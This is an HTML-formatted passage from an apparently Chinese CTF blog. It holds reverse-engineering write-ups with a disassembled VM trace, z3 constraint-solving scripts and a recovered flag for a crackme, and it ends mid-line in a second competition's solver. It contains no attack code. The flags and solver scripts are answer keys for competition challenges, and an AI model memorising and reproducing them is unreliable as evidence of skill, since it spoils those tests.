class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>bc   Va = <span class="hljs-number">00</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>be   Vb = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>c<span class="hljs-number">0</span>   Vc = V<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>c<span class="hljs-number">2</span>   Vd = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>c<span class="hljs-number">4</span>   set I=Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>c<span class="hljs-number">6</span>   store V<span class="hljs-number">0</span>-Ve to addr start at I</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>c<span class="hljs-number">8</span>   Vf = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ca   Ve += Vf  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>cc   V<span class="hljs-number">0</span> = Vc</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ce   V<span class="hljs-number">1</span> = Vd</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>d<span class="hljs-number">0</span>   call <span class="hljs-number">27</span>a</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>d<span class="hljs-number">2</span>   Vc = Vf</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>d<span class="hljs-number">4</span>   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>d<span class="hljs-number">6</span>   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>d<span class="hljs-number">8</span>   Vb = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>da   Vc = V<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>dc   Vd = <span class="hljs-number">02</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>de   set I=Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>e<span class="hljs-number">0</span>   store V<span class="hljs-number">0</span>-Ve to addr start at I</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>e<span class="hljs-number">2</span>   Vf = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>e<span class="hljs-number">4</span>   Ve += Vf  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>e<span class="hljs-number">6</span>   V<span class="hljs-number">0</span> = Vc</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>e<span class="hljs-number">8</span>   V<span class="hljs-number">1</span> = Vd</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ea   call <span class="hljs-number">27</span>a</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ec   Vc = Vf</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ee   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f<span class="hljs-number">0</span>   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f<span class="hljs-number">2</span>   Vb = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f<span class="hljs-number">4</span>   Vc = V<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f<span class="hljs-number">6</span>   Vd = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f<span class="hljs-number">8</span>   set I=Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>fa   store V<span class="hljs-number">0</span>-Ve to addr start at I</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>fc   Vf = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>fe   Ve += Vf  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">500</span>   V<span class="hljs-number">0</span> = Vc</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">502</span>   V<span class="hljs-number">1</span> = Vd</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">504</span>   call <span class="hljs-number">27</span>a</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">506</span>   Vc = Vf</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">508</span>   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">50</span>a   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">50</span>c   Vb = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">50</span>e   Vc = <span class="hljs-number">21</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">510</span>   Vf = <span class="hljs-number">00</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">512</span>   Skips the next instruction if Vb equals Vc</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">514</span>   Vf = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">516</span>   Vb = Vf</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">518</span>   Skips the next instruction if Vb not equals <span class="hljs-number">00</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">51</span>a   jmp <span class="hljs-number">52</span>e</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">51</span>c   clear screen</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">51</span>e   Vb = Vf</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">520</span>   set I=Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">522</span>   store V<span class="hljs-number">0</span>-Ve to addr start at I</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">524</span>   Vf = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">526</span>   Ve += Vf  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">528</span>   call <span class="hljs-number">202</span></span><br></pre></td></tr></tbody></table></figure><p>202函数为输出dead函数，需要跳过，传入27a中寄存器Vd的值表示多项式前该项的系数，三个三个一组可以列出10个方程，写脚本z3求解</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RecurOr</span>(<span class="hljs-params">flags, models, pos=<span class="hljs-number">0</span></span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> pos &lt;= <span class="hljs-built_in">len</span>(flags) - <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + <span class="hljs-number">1</span>))</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> Or(models[flags[pos]] != flags[pos])</span><br><span class="line"></span><br><span class="line">f = [Int(<span class="hljs-string">'v%d'</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]</span><br><span class="line">flag = []</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> f:</span><br><span class="line">    solver.add(c &gt;= <span class="hljs-number">0x0</span>)</span><br><span class="line">    solver.add(c &lt;= <span class="hljs-number">0xff</span>)</span><br><span class="line"></span><br><span class="line">solver.add(f[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">1</span>] + f[<span class="hljs-number">2</span>] == <span class="hljs-number">0x21</span>)</span><br><span class="line">solver.add(<span class="hljs-number">2</span> * f[<span class="hljs-number">0</span>] + f[<span class="hljs-number">1</span>] + f[<span class="hljs-number">2</span>] == <span class="hljs-number">0x2a</span>)</span><br><span class="line">solver.add(f[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">1</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">2</span>] == <span class="hljs-number">0x30</span>)</span><br><span class="line">solver.add(f[<span class="hljs-number">3</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">4</span>] + f[<span class="hljs-number">5</span>] == <span class="hljs-number">0x37</span>)</span><br><span class="line">solver.add(<span class="hljs-number">2</span> * f[<span class="hljs-number">3</span>] + f[<span class="hljs-number">4</span>] + f[<span class="hljs-number">5</span>] == <span class="hljs-number">0x37</span>)</span><br><span class="line">solver.add(f[<span class="hljs-number">3</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">4</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">5</span>] == <span class="hljs-number">0x3b</span>)</span><br><span class="line">solver.add(f[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">7</span>] + f[<span class="hljs-number">8</span>] == <span class="hljs-number">0x1f</span>)</span><br><span class="line">solver.add(<span class="hljs-number">2</span> * f[<span class="hljs-number">6</span>] + f[<span class="hljs-number">7</span>] + f[<span class="hljs-number">8</span>] == <span class="hljs-number">0x16</span>)</span><br><span class="line">solver.add(f[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">7</span>] + <span class="hljs-number">2</span> * f[<span class="hljs-number">8</span>] == <span class="hljs-number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    ff = [model[f[<span class="hljs-number">0</span>]].as_long() - <span class="hljs-number">2</span>, model[f[<span class="hljs-number">1</span>]].as_long() - <span class="hljs-number">1</span>, (model[f[<span class="hljs-number">2</span>]].as_long() ^ <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>,</span><br><span class="line">          model[f[<span class="hljs-number">3</span>]].as_long() - <span class="hljs-number">3</span>, model[f[<span class="hljs-number">4</span>]].as_long() - <span class="hljs-number">2</span>, (model[f[<span class="hljs-number">5</span>]].as_long() - <span class="hljs-number">1</span>) ^ <span class="hljs-number">2</span>,</span><br><span class="line">          model[f[<span class="hljs-number">6</span>]].as_long() // <span class="hljs-number">2</span>, model[f[<span class="hljs-number">7</span>]].as_long() - <span class="hljs-number">1</span>, (model[f[<span class="hljs-number">8</span>]].as_long() - <span class="hljs-number">1</span>) ^ <span class="hljs-number">1</span>, <span class="hljs-number">5</span> - <span class="hljs-number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="hljs-built_in">print</span>(ff)</span><br><span class="line">    solver.add(RecurOr(f, model))</span><br><span class="line"><span class="hljs-comment"># a2def12c13</span></span><br></pre></td></tr></tbody></table></figure><p>两部分都得到，拼起来提交正确</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">6</span>c<span class="hljs-number">8</span>f<span class="hljs-number">1</span>d<span class="hljs-number">78770</span>fe<span class="hljs-number">672122478</span>c<span class="hljs-number">6</span>f<span class="hljs-number">9</span>a<span class="hljs-number">150</span>e<span class="hljs-number">8</span>a<span class="hljs-number">2</span>def<span class="hljs-number">12</span>c<span class="hljs-number">13</span>}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-信息安全竞赛创新实践赛-wp</title>
      <link href="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/"/>
      <url>/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这国赛出的没什么意思，re就给了两道然后被打穿了，等了一天最后放出来一道智能合约……</p><span id="more"></span><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>直接解方程组得到flag</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0x00004F17</span>, <span class="hljs-number">0x00009CF6</span>, <span class="hljs-number">0x00008DDB</span>, <span class="hljs-number">0x00008EA6</span>, <span class="hljs-number">0x00006929</span>, <span class="hljs-number">0x00009911</span>, <span class="hljs-number">0x000040A2</span>, <span class="hljs-number">0x00002F3E</span>, <span class="hljs-number">0x000062B6</span>,<span class="hljs-number">0x00004B82</span>, <span class="hljs-number">0x0000486C</span>, <span class="hljs-number">0x00004002</span>, <span class="hljs-number">0x000052D7</span>, <span class="hljs-number">0x00002DEF</span>, <span class="hljs-number">0x000028DC</span>, <span class="hljs-number">0x0000640D</span>, <span class="hljs-number">0x0000528F</span>, <span class="hljs-number">0x0000613B</span>,<span class="hljs-number">0x00004781</span>, <span class="hljs-number">0x00006B17</span>, <span class="hljs-number">0x00003237</span>, <span class="hljs-number">0x00002A93</span>, <span class="hljs-number">0x0000615F</span>, <span class="hljs-number">0x000050BE</span>, <span class="hljs-number">0x0000598E</span>, <span class="hljs-number">0x00004656</span>, <span class="hljs-number">0x00005B31</span>,<span class="hljs-number">0x0000313A</span>, <span class="hljs-number">0x00003010</span>, <span class="hljs-number">0x000067FE</span>, <span class="hljs-number">0x00004D5F</span>, <span class="hljs-number">0x000058DB</span>, <span class="hljs-number">0x00003799</span>, <span class="hljs-number">0x000060A0</span>, <span class="hljs-number">0x00002750</span>, <span class="hljs-number">0x00003759</span>,<span class="hljs-number">0x00008953</span>, <span class="hljs-number">0x00007122</span>, <span class="hljs-number">0x000081F9</span>, <span class="hljs-number">0x00005524</span>, <span class="hljs-number">0x00008971</span>, <span class="hljs-number">0x00003A1D</span>]</span><br><span class="line"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RecurOr</span>(<span class="hljs-params">flags, models, pos=<span class="hljs-number">0</span></span>):</span></span><br><span class="line">   <span class="hljs-keyword">if</span> (pos &amp;lt; <span class="hljs-built_in">len</span>(flags) - <span class="hljs-number">1</span>):</span><br><span class="line">       <span class="hljs-keyword">return</span> Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + <span class="hljs-number">1</span>))</span><br><span class="line">   <span class="hljs-keyword">else</span>:</span><br><span class="line">       <span class="hljs-keyword">return</span> Or(models[flags[pos]] != flags[pos])</span><br><span class="line"></span><br><span class="line">v = [Int(<span class="hljs-string">'v%d'</span> % (i + <span class="hljs-number">46</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>)]</span><br><span class="line">flag = []</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v:</span><br><span class="line">   solver.add(c &gt;= <span class="hljs-number">0x0</span>)</span><br><span class="line">   solver.add(c &lt;= <span class="hljs-number">0xff</span>)</span><br><span class="line">v46 = v[<span class="hljs-number">0</span>]</span><br><span class="line">v47 = v[<span class="hljs-number">1</span>]</span><br><span class="line">v48 = v[<span class="hljs-number">2</span>]</span><br><span class="line">v49 = v[<span class="hljs-number">3</span>]</span><br><span class="line">v50 = v[<span class="hljs-number">4</span>]</span><br><span class="line">v51 = v[<span class="hljs-number">5</span>]</span><br><span class="line">v52 = v[<span class="hljs-number">6</span>]</span><br><span class="line">v53 = v[<span class="hljs-number">7</span>]</span><br><span class="line">v54 = v[<span class="hljs-number">8</span>]</span><br><span class="line">v55 = v[<span class="hljs-number">9</span>]</span><br><span class="line">v56 = v[<span class="hljs-number">10</span>]</span><br><span class="line">v57 = v[<span class="hljs-number">11</span>]</span><br><span class="line">v58 = v[<span class="hljs-number">12</span>]</span><br><span class="line">v59 = v[<span class="hljs-number">13</span>]</span><br><span class="line">v60 = v[<span class="hljs-number">14</span>]</span><br><span class="line">v61 = v[<span class="hljs-number">15</span>]</span><br><span class="line">v62 = v[<span class="hljs-number">16</span>]</span><br><span class="line">v63 = v[<span class="hljs-number">17</span>]</span><br><span class="line">v64 = v[<span class="hljs-number">18</span>]</span><br><span class="line">v65 = v[<span class="hljs-number">19</span>]</span><br><span class="line">v66 = v[<span class="hljs-number">20</span>]</span><br><span class="line">v67 = v[<span class="hljs-number">21</span>]</span><br><span class="line">v68 = v[<span class="hljs-number">22</span>]</span><br><span class="line">v69 = v[<span class="hljs-number">23</span>]</span><br><span class="line">v70 = v[<span class="hljs-number">24</span>]</span><br><span class="line">v71 = v[<span class="hljs-number">25</span>]</span><br><span class="line">v72 = v[<span class="hljs-number">26</span>]</span><br><span class="line">v73 = v[<span class="hljs-number">27</span>]</span><br><span class="line">v74 = v[<span class="hljs-number">28</span>]</span><br><span class="line">v75 = v[<span class="hljs-number">29</span>]</span><br><span class="line">v76 = v[<span class="hljs-number">30</span>]</span><br><span class="line">v77 = v[<span class="hljs-number">31</span>]</span><br><span class="line">v78 = v[<span class="hljs-number">32</span>]</span><br><span class="line">v79 = v[<span class="hljs-number">33</span>]</span><br><span class="line">v80 = v[<span class="hljs-number">34</span>]</span><br><span class="line">v81 = v[<span class="hljs-number">35</span>]</span><br><span class="line">v82 = v[<span class="hljs-number">36</span>]</span><br><span class="line">v83 = v[<span class="hljs-number">37</span>]</span><br><span class="line">v84 = v[<span class="hljs-number">38</span>]</span><br><span class="line">v85 = v[<span class="hljs-number">39</span>]</span><br><span class="line">v86 = v[<span class="hljs-number">40</span>]</span><br><span class="line">v87 = v[<span class="hljs-number">41</span>]</span><br><span class="line"></span><br><span class="line">solver.add(target[<span class="hljs-number">0</span>] == <span class="hljs-number">34</span> * v49 + <span class="hljs-number">12</span> * v46 + <span class="hljs-number">53</span> * v47 + <span class="hljs-number">6</span> * v48 + <span class="hljs-number">58</span> * v50 + <span class="hljs-number">36</span> * v51 + v52)</span><br><span class="line">solver.add(target[<span class="hljs-number">1</span>] == <span class="hljs-number">27</span> * v50 + <span class="hljs-number">73</span> * v49 + <span class="hljs-number">12</span> * v48 + <span class="hljs-number">83</span> * v46 + <span class="hljs-number">85</span> * v47 + <span class="hljs-number">96</span> * v51 + <span class="hljs-number">52</span> * v52)</span><br><span class="line">solver.add(target[<span class="hljs-number">2</span>] == <span class="hljs-number">24</span> * v48 + <span class="hljs-number">78</span> * v46 + <span class="hljs-number">53</span> * v47 + <span class="hljs-number">36</span> * v49 + <span class="hljs-number">86</span> * v50 + <span class="hljs-number">25</span> * v51 + <span class="hljs-number">46</span> * v52)</span><br><span class="line">solver.add(target[<span class="hljs-number">3</span>] == <span class="hljs-number">78</span> * v47 + <span class="hljs-number">39</span> * v46 + <span class="hljs-number">52</span> * v48 + <span class="hljs-number">9</span> * v49 + <span class="hljs-number">62</span> * v50 + <span class="hljs-number">37</span> * v51 + <span class="hljs-number">84</span> * v52)</span><br><span class="line">solver.add(target[<span class="hljs-number">4</span>] == <span class="hljs-number">48</span> * v50 + <span class="hljs-number">14</span> * v48 + <span class="hljs-number">23</span> * v46 + <span class="hljs-number">6</span> * v47 + <span class="hljs-number">74</span> * v49 + <span class="hljs-number">12</span> * v51 + <span class="hljs-number">83</span> * v52)</span><br><span class="line">solver.add(target[<span class="hljs-number">5</span>] == <span class="hljs-number">15</span> * v51 + <span class="hljs-number">48</span> * v50 + <span class="hljs-number">92</span> * v48 + <span class="hljs-number">85</span> * v47 + <span class="hljs-number">27</span> * v46 + <span class="hljs-number">42</span> * v49 + <span class="hljs-number">72</span> * v52)</span><br><span class="line">solver.add(target[<span class="hljs-number">6</span>] == <span class="hljs-number">26</span> * v51 + <span class="hljs-number">67</span> * v49 + <span class="hljs-number">6</span> * v47 + <span class="hljs-number">4</span> * v46 + <span class="hljs-number">3</span> * v48 + <span class="hljs-number">68</span> * v52)</span><br><span class="line">solver.add(target[<span class="hljs-number">7</span>] == <span class="hljs-number">34</span> * v56 + <span class="hljs-number">12</span> * v53 + <span class="hljs-number">53</span> * v54 + <span class="hljs-number">6</span> * v55 + <span class="hljs-number">58</span> * v57 + <span class="hljs-number">36</span> * v58 + v59)</span><br><span class="line">solver.add(target[<span class="hljs-number">8</span>] == <span class="hljs-number">27</span> * v57 + <span class="hljs-number">73</span> * v56 + <span class="hljs-number">12</span> * v55 + <span class="hljs-number">83</span> * v53 + <span class="hljs-number">85</span> * v54 + <span class="hljs-number">96</span> * v58 + <span class="hljs-number">52</span> * v59)</span><br><span class="line">solver.add(target[<span class="hljs-number">9</span>] == <span class="hljs-number">24</span> * v55 + <span class="hljs-number">78</span> * v53 + <span class="hljs-number">53</span> * v54 + <span class="hljs-number">36</span> * v56 + <span class="hljs-number">86</span> * v57 + <span class="hljs-number">25</span> * v58 + <span class="hljs-number">46</span> * v59)</span><br><span class="line">solver.add(target[<span class="hljs-number">10</span>] == <span class="hljs-number">78</span> * v54 + <span class="hljs-number">39</span> * v53 + <span class="hljs-number">52</span> * v55 + <span class="hljs-number">9</span> * v56 + <span class="hljs-number">62</span> * v57 + <span class="hljs-number">37</span> * v58 + <span class="hljs-number">84</span> * v59)</span><br><span class="line">solver.add(target[<span class="hljs-number">11</span>] == <span class="hljs-number">48</span> * v57 + <span class="hljs-number">14</span> * v55 + <span class="hljs-number">23</span> * v53 + <span class="hljs-number">6</span> * v54 + <span class="hljs-number">74</span> * v56 + <span class="hljs-number">12</span> * v58 + <span class="hljs-number">83</span> * v59)</span><br><span class="line">solver.add(target[<span class="hljs-number">12</span>] == <span class="hljs-number">15</span> * v58 + <span class="hljs-number">48</span> * v57 + <span class="hljs-number">92</span> * v55 + <span class="hljs-number">85</span> * v54 + <span class="hljs-number">27</span> * v53 + <span class="hljs-number">42</span> * v56 + <span class="hljs-number">72</span> * v59)</span><br><span class="line">solver.add(target[<span class="hljs-number">13</span>] == <span class="hljs-number">26</span> * v58 + <span class="hljs-number">67</span> * v56 + <span class="hljs-number">6</span> * v54 + <span class="hljs-number">4</span> * v53 + <span class="hljs-number">3</span> * v55 + <span class="hljs-number">68</span> * v59)</span><br><span class="line">solver.add(target[<span class="hljs-number">14</span>] == <span class="hljs-number">34</span> * v63 + <span class="hljs-number">12</span> * v60 + <span 